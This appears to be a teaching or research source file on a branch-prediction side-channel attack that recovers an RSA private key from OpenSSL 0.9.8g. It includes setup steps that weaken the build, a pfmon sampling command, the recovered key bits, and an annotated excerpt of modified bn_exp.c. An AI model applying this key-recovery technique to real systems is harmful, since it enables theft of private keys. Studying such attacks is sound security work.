/*
 * A real SBPA attack: Attacking the RSA Implementation of OpenSSL
 * ----------------------------------------------------------------
 * 
 * BN_mod_exp_mont is the location where there exists a branch that causes the private key to leak, we target the RSA_private_decrypt function to exploit it
 * The "sliding window" technique is used as a security measure by default, so the program must be modified to use a window size of 1 for the attack to work
 * To do this, set the BN_FLAG_CONSTTIME to 0 and compile with no optimization (-O0)
 *
 * Consider a scenario where you have the following configuration
 *       Public Key:  n = e02137497237346fbf66c1c92005adf442fa23026e4c717da5950fce2af67433a7126fcd6738b5a8a7983c221a1161f6c65067e1296a08f81d3c93e2651c91ad
 *       Private Key: d = 491e0cef44f7857fbf2d42a2de737be067c93a8a9c790bbd35bb7f407efb8fc47d7e73900292eac6d8d72dfe277e73fe4340189ad153062bbbd8f4703d531f81
 *       Key size: 512 bits
 *
 * We exploit the RSA_private_decrypt process using Pfmon, just as we did in the proof:
 * pfmon --long-smpl-periods=1 --smpl-entries=10 -e BRANCH_EVENT --irange=0x400000000007d4f0-0x400000000007d500 -- ./sbpa_rsa
 *
 * Using the log output generated, we can reconstruct the following bit sequence
 * 
 * 1001001000111100000110011101111010001001111011110000101011111111011111100101101
 * 0100001010100010110111100111001101111011111000000110011111001001001110101000101
 * 0100111000111100100001011101111010011010110111011011111110100000001111110111110
 * 1110001111110001000111110101111110011100111001000000000010100100101110101011000
 * 1101101100011010111001011011111111000100111011111100111001111111110010000110100
 * 0000000110001001101011010001010100110000011000101011101110111101100011110100011
 * 1000000111101010100110001111110000001
 *
 * You can check for youself that converting this bit string to hex yields the private key d:
 * 
 * 491e0cef44f7857fbf2d42a2de737be067c93a8a9c790bbd35bb7f407efb8fc47d7e73900292eac6d8d72dfe277e73fe4340189ad153062bbbd8f4703d531f81
 *
 * This attack yields a perfect result on an IA64 architecture, but when trying it on an x86 processor, the result is not as perfect
  * Although the proof-of-concept works on x86 processors, carring the iteration technique out up to 512 bits starts to not work, as after the 368th bit the branch pattern repeats
 */

// modified version of bn_exp.c from OpenSSL 0.9.8g
int BN_mod_exp_mont(BIGNUM *rr, const BIGNUM *a, const BIGNUM *p, const BIGNUM *m, BN_CTX *ctx, BN_MONT_CTX *in_mont) {
	
	// ... code before this is not applicable
	
	// avoid multiplication when there is only a 1 in the buffer
	start = 1; 
	
	// window value
	wvalue = 0; 
	
	// window top bit
	wstart = bits - 1;
	
	// window bottom bit
	wend = 0; 

	if (!BN_to_montgomery(r, BN_value_one(), mont,ctx))          // (gdb) 0x400000000007d4e2 
		goto err;                                                // (gdb) 0x400000000007d4f0 
	                                                             // 
	for (;;) {                                                   // (gdb) 0x400000000007d4f1 
		if (BN_is_bit_set(p, wstart) == 0) {                     // (gdb) 0x400000000007d4f2 :: r.cond.dptk.few 0x400000000007d5d0
			if (!start) {
				if (!BN_mod_mul_montgomery(r, r, r, mont, ctx)) 
					goto err;
			}		
			
			if (wstart == 0) 
				break;
			
			wstart--;
			continue;
		}
		
		// wstart is on a 'set' bit, now scan forward to the end of the window
		j = wstart;
		wvalue = 1;
		wend = 0;
		for (i = 1; i < window; i++) {
			if (wstart - i < 0) 
				break;
			
			if (BN_is_bit_set(p, wstart - i)) { // <-- this branch will also leak the private key
				wvalue <<= (i - wend);
				wvalue |= 1;
				wend = i;
			}
		}

	// ... code in between is not applicable
	
	err:
		if ((in_mont == NULL) && (mont != NULL)) 
			BN_MONT_CTX_free(mont);
		
		BN_CTX_end(ctx);
		bn_check_top(rr);
		
	return(ret);
}